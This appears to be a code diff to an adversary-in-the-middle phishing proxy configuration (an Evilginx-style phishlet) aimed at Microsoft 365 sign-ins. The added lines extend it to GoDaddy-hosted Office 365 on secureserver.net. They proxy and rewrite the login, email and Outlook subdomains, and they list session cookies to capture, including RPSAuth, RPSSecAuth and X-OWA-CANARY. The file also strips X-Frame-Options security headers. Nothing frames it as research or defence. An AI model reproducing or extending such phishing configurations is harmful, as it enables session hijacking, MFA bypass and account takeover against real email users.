@@ -10,6 +10,9 @@ proxy_hosts:
   - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'email', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
@@ -19,6 +22,11 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://www\\.office\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://login\\.live\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'live.com', search: 'https://account\\.live\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  
+  # GoDaddy Office 365 domain replacements
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'email', domain: 'secureserver.net', search: 'https://email\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.secureserver.net', orig_sub: 'outlook', domain: 'secureserver.net', search: 'https://outlook\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.secureserver.net', orig_sub: 'login', domain: 'secureserver.net', search: 'https://login\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   
   # Remove security headers
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
@@ -98,6 +106,17 @@ auth_tokens:
   # Additional tracking cookies
   - domain: '.live.com'
     keys: ['PPLState', 'NAP', 'ANON', 'OParams']
+    type: 'cookie'
+    force_post: false
+
+  # GoDaddy Office 365 email cookies
+  - domain: '.secureserver.net'
+    keys: ['JSESSIONID', 'GD_SESSION', 'auth_token', 'session_id', 'OIDC', 'RPSAuth', 'RPSSecAuth']
+    type: 'cookie'
+    force_post: false
+  
+  - domain: '.email.secureserver.net'
+    keys: ['JSESSIONID', 'OutlookSession', 'X-OWA-CANARY', 'ClientId', 'sessionid', 'auth_key']
     type: 'cookie'
     force_post: false
 
